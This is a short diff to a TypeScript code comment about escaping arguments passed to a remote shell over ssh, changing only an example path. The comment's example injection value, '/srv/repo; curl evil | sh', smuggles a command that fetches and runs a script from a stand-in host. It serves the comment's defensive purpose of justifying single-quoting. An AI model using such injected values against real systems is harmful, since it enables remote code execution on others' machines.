@@ -249,7 +249,7 @@ function lastLine(text: string): string {
  *
  * No LOCAL shell ever sees the argv (`shell: false`), but the REMOTE one does:
  * `ssh` joins its trailing arguments with spaces and hands the result to the
- * remote login shell, which parses it. A `clone` of `/srv/cf; curl evil | sh`
+ * remote login shell, which parses it. A `clone` of `/srv/repo; curl evil | sh`
  * would therefore execute. Every remote word is POSIX single-quoted first, so
  * the far side receives exactly the words that were given here.
  */
